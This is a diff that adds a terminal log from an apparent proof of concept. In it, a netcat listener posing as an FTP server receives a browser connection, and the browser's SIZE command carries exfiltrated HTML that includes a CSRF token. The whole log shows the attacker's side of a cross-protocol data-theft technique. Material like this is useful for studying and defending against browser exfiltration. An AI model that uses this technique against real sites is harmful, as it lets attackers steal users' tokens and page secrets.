@@ -1,0 +1,15 @@
+$ nc -lvCp 21
+listening on [any] 21 ...
+connect to [X.X.X.X] from some.domain [Y.Y.Y.Y]
+220 ok
+USER anonymous
+331 pass
+PASS chrome@example.com
+230 ok
+SYST
+215 UNIX Type: L8
+PWD
+257 "/"
+TYPE I
+200 Switching to Binary mode
+SIZE / !</h1>    <input type="text" name="csrf-token" value="s3cr3t"/>    <p>Some text in a paragraph</p>    <p>More text in a paragraph, to make the exfiltrated data longer, and here is the stopping char :
